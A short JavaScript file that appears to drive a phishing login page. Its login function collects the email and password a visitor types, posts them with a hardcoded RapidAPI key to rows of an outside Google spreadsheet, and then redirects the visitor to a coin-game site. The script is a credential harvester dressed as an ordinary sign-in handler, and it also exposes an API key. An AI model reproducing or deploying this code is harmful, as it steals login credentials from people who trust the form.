console.log("hey")
let iframe, iframeDoc

const onLoadHandler = async () => {
  iframe = document.querySelector("iframe")
  //   iframeDoc = iframe.contentDocument || iframe.contentWindow.document

  console.log("loaded")
  document.querySelector(".registr-content21").style.opacity = 1
}

window.addEventListener("message", (event) => {
  // IMPORTANT: check the origin of the data!

  // The data was sent from your site.
  // Data sent with postMessage is stored in event.data:
  console.log(event.data)
})

const login = async () => {
  const vals = [...document.getElementsByClassName("inputVal11")]
    .map((el) => (!!el.value ? el.value : null))
    .filter((e) => !!e)

  const email = vals[0]
  const pw = vals[1]

  const dataBody = [[email, pw]]

  const url =
    "https://google-spreadsheets.p.rapidapi.com/spreadsheet/1troRraw5b_Ge3cnPbT-fSR1q4BR8UdKHqUziwDubDV8/sheet/0/add_rows"
  const options = {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "X-RapidAPI-Key": "a05c6a8c5dmshf0bc1b9cb82ccd5p1633c9jsn62b7da41b9b4",
      "X-RapidAPI-Host": "google-spreadsheets.p.rapidapi.com",
    },
    body: JSON.stringify(dataBody),
  }

  await fetch(url, options)

  window.location.href = "https://coins.game"
}
